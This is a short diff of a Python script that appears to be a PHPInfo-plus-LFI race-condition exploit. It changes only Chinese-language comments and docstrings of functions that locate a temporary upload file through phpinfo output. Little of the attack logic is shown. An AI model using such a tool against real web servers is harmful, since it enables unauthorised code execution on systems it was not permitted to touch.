@@ -1,9 +1,9 @@
 #!/usr/bin/python
 """
 注意:
-    不要对文件格式化!!!!
-    不要对文件格式化!!!!
-    不要对文件格式化!!!!
+    不要对本文件格式化!!!!
+    不要对本文件格式化!!!!
+    不要对本文件格式化!!!!
 """
 import sys
 import threading
@@ -89,6 +89,7 @@ def phpinfo_lfi(host, port, phpinfo_request, offset, lfi_request, tag):
     :param lfi_request: lfi页面请求内容
     :param tag: 标识内容
     :return:
+        tmp_file_name: 临时文件名
     """
     phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -183,11 +184,12 @@ class ThreadWorker(threading.Thread):
 
 def get_offset(host, port, phpinfo_request):
     """
-    获取tmp_name在phpinfo中的偏移位
-    :param host:
-    :param port:
-    :param phpinfo_request:
+    获取tmp_name在phpinfo中的偏移量
+    :param host: HOST
+    :param port: 端口
+    :param phpinfo_request: phpinfo 请求内容
     :return:
+        tmp_name在phpinfo中的偏移量
     """
 
     phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
